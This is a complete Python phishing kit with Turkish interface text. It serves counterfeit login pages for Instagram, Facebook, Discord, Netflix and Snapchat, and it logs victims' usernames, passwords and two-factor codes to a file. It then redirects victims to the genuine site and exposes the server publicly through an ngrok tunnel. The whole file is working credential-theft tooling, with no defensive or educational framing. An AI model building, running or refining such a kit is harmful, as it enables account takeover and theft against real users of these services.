#!/usr/bin/env python3
import os, sys, http.server, socketserver, time, json, random, uuid, logging, threading, subprocess, platform, requests, tarfile
from http.cookies import SimpleCookie
from urllib.parse import parse_qs, urlparse

PASSWORD = os.environ.get("PHISHER_PASSWORD", "admiral71100daphne")
PORT = int(os.environ.get("PHISHER_PORT", "8080"))
MAX_ATTEMPTS = 5
SESSION_TIMEOUT = 1800
NO_2FA = {"netflix", "snapchat", "discord"}

IS_ISH = os.path.exists("/usr/bin/apk") or "ish" in platform.platform().lower()
IS_TERMUX = os.path.exists("/data/data/com.termux")

logging.basicConfig(level=logging.INFO, format='%(asctime)s %(message)s')

class SessionManager:
    def __init__(self):
        self.sessions = {}
        self.ip_attempts = {}
        self.lock = threading.Lock()
        threading.Thread(target=self._cleanup_loop, daemon=True).start()
    def _cleanup_loop(self):
        while True:
            time.sleep(120)
            self.cleanup()
    def create(self, ip, ua, site):
        sid = str(uuid.uuid4())
        with self.lock:
            self.sessions[sid] = {"id": sid, "ip": ip, "ua": ua, "site": site, "created": time.time(), "stage": "login", "attempts": 0}
        return sid
    def get(self, sid):
        if not sid: return None
        try: uuid.UUID(sid)
        except ValueError: return None
        with self.lock:
            s = self.sessions.get(sid)
            if s and time.time() - s["created"] > SESSION_TIMEOUT:
                del self.sessions[sid]
                return None
            return s
    def update(self, sid, **kw):
        with self.lock:
            if sid in self.sessions: self.sessions[sid].update(kw)
    def fail(self, sid):
        with self.lock:
            if sid in self.sessions:
                self.sessions[sid]["attempts"] += 1
                ip = self.sessions[sid]["ip"]
                self.ip_attempts.setdefault(ip, []).append(time.time())
    def success(self, sid):
        with self.lock:
            if sid in self.sessions:
                ip = self.sessions[sid]["ip"]
                self.ip_attempts.pop(ip, None)
    def blocked(self, sid):
        s = self.get(sid)
        if not s: return False
        if s["attempts"] >= MAX_ATTEMPTS: return True
        ip = s["ip"]
        now = time.time()
        return len([t for t in self.ip_attempts.get(ip, []) if now - t < 60]) > 20
    def cleanup(self):
        now = time.time()
        with self.lock:
            for sid in list(self.sessions):
                if now - self.sessions[sid]["created"] > SESSION_TIMEOUT: del self.sessions[sid]
            for ip in list(self.ip_attempts):
                self.ip_attempts[ip] = [t for t in self.ip_attempts[ip] if now - t < 60]
                if not self.ip_attempts[ip]: del self.ip_attempts[ip]

class Captcha:
    def __init__(self):
        self.answers = {}
        self.lock = threading.Lock()
    def new(self, sid):
        a, b = random.randint(1,50), random.randint(1,50)
        op = random.choice('+-*')
        ans = a+b if op=='+' else a-b if op=='-' else a*b
        with self.lock: self.answers[sid] = str(ans)
        return f"{a} {op} {b} = ?"
    def check(self, sid, answer):
        with self.lock: correct = self.answers.pop(sid, None)
        return correct == answer

class Logger:
    def __init__(self):
        self.lock = threading.Lock()
    def log(self, s, stage, data=None):
        rec = {"time": time.ctime(), "sid": s["id"][:8], "ip": s["ip"], "site": s["site"], "stage": stage, "data": data or {}}
        with self.lock:
            with open("log.jsonl","a") as f: f.write(json.dumps(rec,ensure_ascii=False)+"\n")

SITES = {
    "instagram": ("Instagram", "https://www.instagram.com/accounts/login/"),
    "facebook": ("Facebook", "https://www.facebook.com/login/"),
    "netflix": ("Netflix", "https://www.netflix.com/login"),
    "snapchat": ("Snapchat", "https://accounts.snapchat.com/"),
    "discord": ("Discord", "https://discord.com/login"),
}

CSS = """<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.card{width:100%;max-width:380px;background:#fff;padding:40px 30px;text-align:center;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
h1{font-size:24px;margin-bottom:5px}.sub{color:#666;font-size:14px;margin-bottom:25px}
input{width:100%;padding:14px;margin:8px 0;border:2px solid #eee;border-radius:8px;font-size:15px}input:focus{border-color:#0095f6;outline:none}
button{width:100%;padding:14px;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer;margin:15px 0}
.captcha{padding:15px;margin:10px 0;border-radius:8px;font-size:18px;font-weight:bold;text-align:center;background:#f5f5f5}
a{font-size:13px;text-decoration:none;display:block;margin:10px 0}.error{color:red;font-size:14px;margin:10px 0}</style>"""

TEMPLATES = {
    "instagram": f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Instagram</title>{CSS}
body{{background:#fafafa}}.card{{border:1px solid #dbdbdb}}button{{background:#0095f6}}a{{color:#385185}}</head><body>
<div class="card"><div style="font-size:40px;margin-bottom:25px">📷 Instagram</div>{{error}}
<form method="POST" action="/login"><input name="username" placeholder="Kullanici adi veya e-posta" required>
<input name="password" type="password" placeholder="Sifre" required>
<div class="captcha">🛡️ {{captcha}}</div><input name="captcha" placeholder="Cevap" required>
<button type="submit">Giris Yap</button></form><a href="#">Sifreni mi unuttun?</a></div></body></html>""",
    "facebook": f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Facebook</title>{CSS}
body{{background:#f0f2f5;font-family:Helvetica,Arial,sans-serif}}.card{{border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1),0 8px 16px rgba(0,0,0,0.1)}}h1{{color:#1877f2;font-size:35px}}button{{background:#1877f2;font-size:18px}}a{{color:#1877f2}}</head><body>
<div class="card"><h1>facebook</h1><div class="sub">Facebook hesabina giris yap</div>{{error}}
<form method="POST" action="/login"><input name="email" placeholder="E-posta veya telefon" required>
<input name="pass" type="password" placeholder="Sifre" required>
<div class="captcha">🛡️ {{captcha}}</div><input name="captcha" placeholder="Cevap" required>
<button type="submit">Giris Yap</button></form><a href="#">Sifreni mi unuttun?</a></div></body></html>""",
    "discord": f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Discord</title>{CSS}
body{{background:#36393f;color:#fff}}.card{{background:#2f3136;max-width:480px;text-align:left}}h1{{color:#fff;text-align:center}}.sub{{color:#b9bbbe;text-align:center}}label{{color:#b9bbbe;font-size:12px;font-weight:bold;text-transform:uppercase;display:block;margin-top:15px}}input{{background:#202225;border:1px solid #040405;color:#fff}}input:focus{{border-color:#5865f2}}button{{background:#5865f2}}a{{color:#5865f2;text-align:center}}</head><body>
<div class="card"><div style="text-align:center;font-size:40px;margin-bottom:20px">🎮</div><h1>Hos geldin!</h1><div class="sub">Discord'a tekrar hos geldin!</div>{{error}}
<form method="POST" action="/login"><label>E-POSTA VEYA TELEFON</label><input name="email" required>
<label>SIFRE</label><input name="password" type="password" required>
<div class="captcha" style="background:#202225;color:#fff;text-align:center">🛡️ {{captcha}}</div>
<input name="captcha" placeholder="Cevap" style="background:#202225;border:1px solid #040405;color:#fff" required>
<button type="submit">Giris Yap</button></form><a href="#">Sifreni mi unuttun?</a></div></body></html>""",
    "netflix": f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Netflix</title>{CSS}
body{{background:#000;color:#fff}}.card{{background:rgba(0,0,0,0.75);color:#fff}}h1{{color:#fff}}.sub{{color:#b3b3b3}}input{{background:#333;border:none;color:#fff}}input:focus{{background:#454545}}button{{background:#e50914}}a{{color:#b3b3b3}}</head><body>
<div class="card"><h1>Oturum Ac</h1><div class="sub">Netflix izlemeye devam et</div>{{error}}
<form method="POST" action="/login"><input name="email" placeholder="E-posta veya telefon" required>
<input name="password" type="password" placeholder="Sifre" required>
<div class="captcha" style="background:#333;color:#fff">🛡️ {{captcha}}</div>
<input name="captcha" placeholder="Cevap" style="background:#333;border:none;color:#fff" required>
<button type="submit">Oturum Ac</button></form></div></body></html>""",
    "snapchat": f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Snapchat</title>{CSS}
body{{background:#FFFC00;font-family:Avenir,Helvetica,Arial,sans-serif}}.card{{border-radius:20px;box-shadow:0 10px 40px rgba(0,0,0,0.2)}}h1{{color:#000}}button{{background:#000;color:#FFFC00;border-radius:12px}}a{{color:#000}}</head><body>
<div class="card"><div style="font-size:50px;margin-bottom:10px">👻</div><h1>Snapchat</h1><div class="sub">Giris Yap</div>{{error}}
<form method="POST" action="/login"><input name="email" placeholder="E-posta veya kullanici adi" required>
<input name="password" type="password" placeholder="Sifre" required>
<div class="captcha" style="background:#FFFDE7">🛡️ {{captcha}}</div>
<input name="captcha" placeholder="Cevap" required>
<button type="submit">Giris Yap</button></form><a href="#">Sifreni mi unuttun?</a></div></body></html>""",
}

def page_2fa(site_name, error=None):
    err = f'<div class="error">{error}</div>' if error else ""
    return f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>2FA - {site_name}</title>
<style>*{{margin:0;padding:0;box-sizing:border-box}}body{{background:#fafafa;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}}
.card{{max-width:350px;width:100%;background:#fff;padding:40px 30px;text-align:center;border-radius:10px;border:1px solid #dbdbdb}}
h2{{margin-bottom:10px}}p{{color:#666;font-size:14px;margin-bottom:20px}}
input{{width:100%;padding:15px;text-align:center;font-size:24px;border:2px solid #ddd;border-radius:8px;letter-spacing:10px}}input:focus{{border-color:#0095f6;outline:none}}
button{{width:100%;padding:12px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer;margin-top:20px}}</style></head><body>
<div class="card"><h2>Iki Adimli Dogrulama</h2><p>{site_name} hesabina giris icin kod gir</p>{err}
<form method="POST" action="/2fa"><input name="code" placeholder="000000" maxlength="6" required pattern="[0-9]{{6}}" title="6 haneli rakam">
<button type="submit">Dogrula</button></form></div></body></html>"""

class Handler(http.server.SimpleHTTPRequestHandler):
    sessions = SessionManager()
    captcha = Captcha()
    logger = Logger()
    site = "instagram"

    def do_GET(self):
        path = urlparse(self.path).path
        ip, ua = self.client_address[0], self.headers.get('User-Agent','?')
        sid = SimpleCookie(self.headers.get('Cookie','')).get('session_id')
        sid = sid.value if sid else None
        s = self.sessions.get(sid)

        if not s and path in ("/", "/index.html"):
            sid = self.sessions.create(ip, ua, self.site)
            s = self.sessions.get(sid)
            self._set_cookie(sid)

        if not s: self.send_error(404); return
        if self.sessions.blocked(sid): self.send_response(403); self.end_headers(); return

        if path in ("/", "/index.html"):
            err = "Yanlis captcha!" if "error=captcha" in self.path else None
            q = self.captcha.new(sid)
            tpl = TEMPLATES.get(s["site"], TEMPLATES["instagram"])
            html = tpl.replace("{{captcha}}", q).replace("{{error}}", f'<div class="error">{err}</div>' if err else "")
            self._send_html(html)
        elif path == "/2fa":
            if s.get("stage") == "2fa_ok":
                self._redirect(SITES.get(s["site"], ("", "https://google.com"))[1])
            elif s.get("stage") == "login_ok":
                site_name = SITES.get(s["site"], ("Site",))[0]
                err = "Gecersiz kod!" if "error=invalid" in self.path else None
                self._send_html(page_2fa(site_name, err))
            else:
                self._redirect("/")
        else:
            self.send_error(404)

    def do_POST(self):
        path = urlparse(self.path).path
        try: length = int(self.headers.get('Content-Length',0))
        except: length = 0
        try: data = self.rfile.read(length).decode()
        except: data = ""
        parsed = parse_qs(data) if data else {}
        sid = SimpleCookie(self.headers.get('Cookie','')).get('session_id')
        sid = sid.value if sid else None
        s = self.sessions.get(sid)

        if not s or self.sessions.blocked(sid): self._redirect("/blocked"); return

        if path == "/login":
            if not self.captcha.check(sid, parsed.get("captcha",[""])[0]):
                self.sessions.fail(sid); self._redirect("/?error=captcha"); return
            login_data = {k:v[0] for k,v in parsed.items() if k!="captcha"}
            self.sessions.update(sid, login_data=login_data, stage="login_ok")
            self.logger.log(s, "login", login_data)
            if s["site"] in NO_2FA:
                self.sessions.success(sid)
                self._redirect(SITES.get(s["site"], ("", "https://google.com"))[1])
            else:
                self._redirect("/2fa")
        elif path == "/2fa" and s.get("stage") == "login_ok":
            code = parsed.get("code",[""])[0]
            if code and len(code)==6 and code.isdigit():
                self.sessions.update(sid, stage="2fa_ok", code_data={"code":code})
                self.logger.log(s, "2fa", {"code":code})
                self.sessions.success(sid)
                self._redirect(SITES.get(s["site"], ("", "https://google.com"))[1])
            else:
                self._redirect("/2fa?error=invalid")
        else:
            self._redirect("/")

    def _send_html(self, html):
        self.send_response(200); self.send_header('Content-type','text/html; charset=utf-8')
        self.end_headers(); self.wfile.write(html.encode())
    def _set_cookie(self, sid):
        self.send_header('Set-Cookie', f'session_id={sid}; Path=/; HttpOnly; Max-Age={SESSION_TIMEOUT}')
    def _redirect(self, loc):
        self.send_response(302); self.send_header('Location', loc); self.end_headers()
    def log_message(self, *args): pass

def start_ngrok(port):
    try:
        subprocess.Popen(["ngrok", "http", str(port)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(3)
        r = requests.get("http://127.0.0.1:4040/api/tunnels")
        return r.json()["tunnels"][0]["public_url"]
    except: return None

def main():
    os.system('clear')
    for i in range(3):
        if input("Sifre: ") == PASSWORD: break
        print(f"Hatali ({2-i})")
    else: sys.exit(1)
    print("\nSITELER:"); keys = list(SITES.keys())
    for i,k in enumerate(keys,1): print(f"  [{i}] {SITES[k][0]}")
    try: sec = int(input("\n> ")); Handler.site = keys[sec-1] if 1<=sec<=len(keys) else "instagram"
    except: pass
    port = int(input(f"Port ({PORT}): ") or PORT)
    print("\n🌐 Ngrok başlatılıyor...")
    ngrok_url = start_ngrok(port)
    print(f"\n✅ Site: {SITES[Handler.site][0]}")
    if ngrok_url: print(f"🔗 LINK: {ngrok_url}")
    print(f"📱 Yerel: http://localhost:{port}\n📝 Log: log.jsonl\n🛑 Ctrl+C\n")
    server = socketserver.ThreadingTCPServer(("", port), Handler)
    server.allow_reuse_address = True; server.daemon_threads = True
    try: server.serve_forever()
    except KeyboardInterrupt: server.shutdown(); print("\n🛑 Durduruldu!")

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: print("\nCikis!"); sys.exit(0)
